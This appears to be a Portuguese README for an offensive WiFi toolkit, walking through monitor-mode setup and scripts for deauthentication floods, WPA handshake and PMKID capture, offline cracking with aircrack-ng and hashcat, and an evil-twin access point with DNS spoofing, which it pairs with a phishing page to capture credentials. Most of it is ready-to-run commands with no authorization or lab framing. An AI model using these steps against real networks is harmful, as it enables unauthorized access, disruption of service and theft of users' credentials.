# WiFi — Tutorial

> Todos os scripts requerem **Linux + root**. No Windows, use VM ou WSL2.

## Dependencias
```bash
pip install scapy
apt install aircrack-ng hcxdumptool hcxtools hostapd dnsmasq
```

---

## Preparacao — Modo Monitor
Antes de qualquer script WiFi:
```bash
airmon-ng check kill          # mata processos conflitantes
airmon-ng start wlan0         # ativa monitor mode -> wlan0mon
iwconfig                      # confirma: Mode:Monitor
```

---

## deauth.py
Desconecta clientes de um AP enviando frames 802.11 Deauth.

```bash
# Ver APs e clientes:
airodump-ng wlan0mon

# Rodar deauth:
python deauth.py
# Monitor iface: wlan0mon
# AP BSSID: AA:BB:CC:DD:EE:FF
# Target MAC: FF:FF:FF:FF:FF:FF   <- todos os clientes
# Frame count: 0                  <- infinito
```

**Uso tipico:** kickar clientes para forcá-los a se reconectar e capturar handshake.

---

## handshake_capture.sh
Captura handshake WPA/WPA2 para crackear offline.

```bash
# Passo 1: descobrir APs
airodump-ng wlan0mon

# Passo 2: capturar handshake
bash handshake_capture.sh
# Interface: wlan0
# BSSID: AA:BB:CC:DD:EE:FF
# Channel: 6
# Output: captura

# Passo 3: forcar reconexao (em outro terminal)
python deauth.py   # target MAC = FF:FF:FF:FF:FF:FF

# Passo 4: crackear
aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
# Ou com hashcat:
hcxpcapngtool -o hash.22000 captura-01.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

---

## pmkid_attack.py
Captura PMKID sem precisar de cliente conectado — mais rapido que handshake.

```bash
python pmkid_attack.py
# Interface: wlan0
# Target BSSID: AA:BB:CC:DD:EE:FF  (ou deixe vazio pra todos)
# Output: pmkid_cap
# Ctrl+C apos 30-60 segundos

# Crackear:
hashcat -m 22000 pmkid_cap.22000 rockyou.txt
```

---

## evil_twin.sh
Cria AP falso clonando o SSID alvo com captive portal que redireciona todo trafego para o atacante.

```bash
bash evil_twin.sh
# AP interface: wlan1       <- interface secundaria
# SSID: TargetNetwork       <- clonar nome exato
# Channel: 6
# Internet interface: eth0  <- para ter internet real (mais convincente)
```

Clientes que conectam no Evil Twin tem DNS spoofado apontando para a maquina do atacante.  
Combine com `SocialEngineering/phishing_page.py` para capturar credenciais.
